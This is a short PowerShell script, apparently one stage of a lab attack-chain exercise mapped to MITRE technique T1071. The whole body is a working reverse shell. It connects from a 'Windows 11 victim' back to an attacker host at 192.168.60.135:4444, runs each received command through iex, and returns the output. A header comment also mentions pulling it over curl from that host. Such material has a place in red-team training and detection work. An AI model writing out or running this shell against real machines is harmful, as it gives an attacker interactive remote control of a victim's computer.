# Stage 8 — Command and Control (T1071), part 2/2
# Host: Windows 11 victim, run inside the SSH session (or via `curl http://192.168.60.135:4444`)
# Reverse shell using the standard .NET TCPClient — no CVE / exploit involved.

$client = New-Object System.Net.Sockets.TCPClient("192.168.60.135", 4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535 | % { 0 }
while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data      = (New-Object System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    $sendback  = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte  = ([Text.Encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}
$client.Close()
